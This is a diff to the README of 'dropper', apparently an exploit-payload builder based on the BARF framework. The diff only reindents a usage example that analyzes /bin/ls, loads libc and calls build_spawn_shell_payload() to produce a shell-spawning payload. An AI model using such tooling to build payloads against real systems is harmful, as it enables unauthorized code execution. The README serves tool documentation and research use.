@@ -21,16 +21,12 @@ Dependencies
 
 Example
 =======
-
-
-from dropper import dropper
-
-
-dr = dropper.dropper('/bin/ls')
-dr.analyze_all()
-dr.add_shared_object('/lib/x86_64-linux-gnu/libc.so.6')
-dr.set_function_for_address_resolving('strrchr')
-pl = dr.build_spawn_shell_payload()
+    from dropper import dropper
+    dr = dropper.dropper('/bin/ls')
+    dr.analyze_all()
+    dr.add_shared_object('/lib/x86_64-linux-gnu/libc.so.6')
+    dr.set_function_for_address_resolving('strrchr')
+    pl = dr.build_spawn_shell_payload()
 
 TODO
 ====
@@ -45,4 +41,5 @@ Feel free con contact me for info
 rizlik@inventati.org
 
 [0] https://github.com/programa-stic/barf-project.git
+
 [1] https://github.com/rizlik/barf-project.git
